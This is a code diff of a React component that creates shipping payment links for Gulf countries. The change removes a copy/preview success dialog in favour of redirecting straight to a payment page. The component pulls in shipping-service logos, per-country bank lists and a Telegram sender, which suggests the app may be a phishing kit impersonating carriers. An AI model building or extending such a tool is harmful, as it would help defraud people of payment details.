@@ -10,19 +10,10 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, ArrowRight } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
-import {
-  AlertDialog,
-  AlertDialogAction,
-  AlertDialogContent,
-  AlertDialogDescription,
-  AlertDialogFooter,
-  AlertDialogHeader,
-  AlertDialogTitle,
-} from "@/components/ui/alert-dialog";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -37,9 +28,6 @@ const CreateShippingLink = () => {
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
   const [selectedBank, setSelectedBank] = useState("");
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
-  const [createdLinkUrl, setCreatedLinkUrl] = useState("");
-  const [linkId, setLinkId] = useState("");
   
   // Get banks for the selected country
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
@@ -95,13 +83,6 @@ const CreateShippingLink = () => {
         timestamp: new Date().toISOString()
       });
 
-      // حفظ الرابط وإظهار Dialog
-      // الرابط الصحيح هو /r/ (microsite) للمشاركة مع العملاء
-      const micrositeUrl = `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`;
-      setCreatedLinkUrl(micrositeUrl);
-      setLinkId(link.id);
-      setShowSuccessDialog(true);
-      
       if (telegramResult.success) {
         toast({
           title: "تم الإرسال بنجاح",
@@ -115,27 +96,12 @@ const CreateShippingLink = () => {
           variant: "destructive",
         });
       }
+
+      // Navigate to payment page with service parameter
+      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
     } catch (error) {
       console.error("Error creating link:", error);
     }
-  };
-  
-  const handleCopyLink = () => {
-    navigator.clipboard.writeText(createdLinkUrl);
-    toast({
-      title: "تم النسخ!",
-      description: "تم نسخ الرابط إلى الحافظة",
-    });
-  };
-  
-  const handlePreview = () => {
-    window.open(createdLinkUrl, '_blank');
-  };
-  
-  const handleContinue = () => {
-    setShowSuccessDialog(false);
-    // الانتقال لصفحة الدفع مباشرة
-    navigate(`/pay/${linkId}/recipient?service=${selectedService}`);
   };
   
   if (!countryData) {
@@ -303,53 +269,6 @@ const CreateShippingLink = () => {
           </Card>
         </div>
       </div>
-      
-      {/* Success Dialog with Copy and Preview buttons */}
-      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-        <AlertDialogContent className="max-w-md" dir="rtl">
-          <AlertDialogHeader>
-            <AlertDialogTitle className="text-xl text-center">
-              ✅ تم إنشاء رابط الدفع بنجاح!
-            </AlertDialogTitle>
-            <AlertDialogDescription className="text-center">
-              يمكنك نسخ الرابط أو معاينته قبل المتابعة
-            </AlertDialogDescription>
-          </AlertDialogHeader>
-          
-          <div className="my-4">
-            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
-              {createdLinkUrl}
-            </div>
-            
-            <div className="flex gap-2">
-              <Button
-                onClick={handleCopyLink}
-                variant="outline"
-                className="flex-1"
-              >
-                <Copy className="w-4 h-4 ml-2" />
-                نسخ الرابط
-              </Button>
-              
-              <Button
-                onClick={handlePreview}
-                variant="outline"
-                className="flex-1"
-              >
-                <ExternalLink className="w-4 h-4 ml-2" />
-                معاينة
-              </Button>
-            </div>
-          </div>
-          
-          <AlertDialogFooter>
-            <AlertDialogAction onClick={handleContinue} className="w-full">
-              <ArrowRight className="w-4 h-4 ml-2" />
-              متابعة للدفع
-            </AlertDialogAction>
-          </AlertDialogFooter>
-        </AlertDialogContent>
-      </AlertDialog>
     </div>
   );
 };
